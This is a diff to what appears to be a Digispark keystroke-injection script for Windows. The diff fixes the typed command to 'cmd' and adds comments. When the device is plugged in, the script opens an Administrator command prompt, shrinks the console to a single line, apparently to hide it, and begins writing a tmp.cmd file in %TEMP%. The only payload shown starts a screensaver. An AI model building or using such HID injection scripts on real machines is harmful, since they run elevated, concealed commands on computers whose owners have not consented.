@@ -2,7 +2,7 @@
 // This script is designed for use on Windows machines with QWERTY as a keyboard layout
 // As DigiKeyboard Library does not support AZERTY text yet in print(), you have to use the "az_qw_convert.sh" script to convert AZERTY to QWERTY layout.
 // For more scripts checkout: https://git.io/vAGf4
-// Developer: NBN | 02/13/2018 @19:00
+// Developer: NBN | 02/13/2018 @19:00 UTC
 void setup() {
   // Initialize the digital pin as an output.
   pinMode(1, OUTPUT); //LED on Model A
@@ -16,7 +16,7 @@ void loop() {
 // BEGIN - Open CMD in Administrator Privileges
   DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
   DigiKeyboard.delay(1500);
-  DigiKeyboard.print("c;d");
+  DigiKeyboard.print("cmd");
   DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
   DigiKeyboard.delay(1000);
@@ -28,9 +28,9 @@ void loop() {
   DigiKeyboard.delay(1500);
   DigiKeyboard.println("MODE CON: COLS=15 LINES=1");
   DigiKeyboard.delay(250);
-  DigiKeyboard.println("cd %TEMP%");
+  DigiKeyboard.println("cd %TEMP%"); // Change to temp directory
   DigiKeyboard.delay(250);
-  DigiKeyboard.println("copy con tmp.cmd");
+  DigiKeyboard.println("copy con tmp.cmd"); // Create the file tmp.cmd
   DigiKeyboard.delay(500);
   DigiKeyboard.println("start C:/Windows/System32/Ribbons.scr /s");
   DigiKeyboard.delay(250);
